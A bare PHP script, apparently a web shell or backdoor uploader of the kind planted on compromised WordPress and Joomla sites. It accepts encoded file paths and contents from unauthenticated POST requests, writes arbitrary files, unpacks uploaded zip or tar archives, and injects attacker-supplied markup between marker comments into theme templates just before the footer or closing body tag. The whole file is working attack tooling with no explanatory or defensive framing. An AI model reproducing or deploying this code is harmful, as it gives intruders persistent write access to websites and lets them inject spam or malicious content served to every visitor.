<?php
   function hex3bin($str) {
    $bin = "";
    $i = 0;
    do {
        $bin .= chr(hexdec($str{$i}.$str{($i + 1)}));
        $i += 2;
    } while ($i < strlen($str));
    return $bin;
}
   function db_connect()
   {
   		global $db_path,$db_name, $db_login, $db_password, $connect;
		$connect = mysql_connect($db_path,$db_login,$db_password);
		if (!mysql_select_db($db_name))
		die (mysql_error()."<br>"); 
		return $connect;
   }
	
	if (!isset($_POST["path"])) die("Error: No path");
	if (!isset($_POST["text"])) die("Error: No text");
       
    $path = base64_decode(urldecode($_POST["path"]));
	$text = hex3bin(urldecode($_POST["text"]));

	if ($_POST["isblog"]==1)
    {	
		$fpath = $path;
		//print $fpath."<br>";
		if (strpos($path,'wp-content')) 
			$blog_type='w'; 
		else 
			$blog_type='j'; 
			
		if (!is_file($fpath)) die("Error: No template file"); 
		@chmod($fpath,0644);
		$ftext=file_get_contents($fpath);
		if (!$ftext) die("Error: Cannot read template file"); 
		if ($blog_type=='j') $mark = '</body'; 
		else {
			if (strpos($ftext,'<?php get_footer'))
			$mark = '<?php get_footer'; else $mark = '</body';
		};
		
		$text = str_replace(chr(0),'',$text);
		//print $text;
		$bmark = '<!--#begin#-->'; 
		$emark = ' <!--#end#--> ';
		$pos1 = strpos($ftext,$bmark);
		$pos2 = strpos($ftext,$emark);
		//print $pos1.':'.$pos2;
		if (($pos1)&&($pos2)) 
		$ftext = substr_replace($ftext,'',$pos1,$pos2-$pos1+strlen($emark));
		$text = $bmark.$text.$emark.$mark;
		$ftext=str_replace($mark,$text,$ftext);
		//print $ftext;
 		//unlink($fpath);
		$handle = @fopen($fpath, "w+");
        if (!$handle) die("Error: Cannot file open");
	    if (fwrite($handle, $ftext)==false) {fclose($handle); die ("Error: Cannot file write");}
    	fclose($handle);
				
		die("ok ");
					
    }
	
	$create = false;
	if (!is_file($path)) $create = true;
    if (!$create) @chmod($path,0644);
    $handle = @fopen($path, "w");
    if (!$handle) die("Error: Cannot file open and create");
	if ($create) chmod($path,0644);
    
    if (fwrite($handle, $text)==false) {fclose($handle); die ("Error: Cannot file write");}
    fclose($handle);
    
    if ($_POST["iszip"]==1)
    {
      require_once('pclzip.lib.php');
      set_time_limit(1800);
   	  $zip = new PclZip($path);
	  $list = $zip->extract(PCLZIP_OPT_SET_CHMOD, 0644);
	  if ($list)
	  print "zip unpacked. "; else die("Error: Cannot unpack archive");	
	  unlink($path);
	  //print_r($list);
    };

    if ($_POST["iszip"]==2)
    {
      require_once('tar.php');
      set_time_limit(1800);
   	  $zip = new Archive_Tar($path);
   	  $list = $zip->extract();
	  if ($list)
	  print "tar.gz unpacked. "; else die("Error: Cannot unpack tar.gz");	
	  unlink($path);
	  //print_r($list);
    };
    
    print "ok";
?>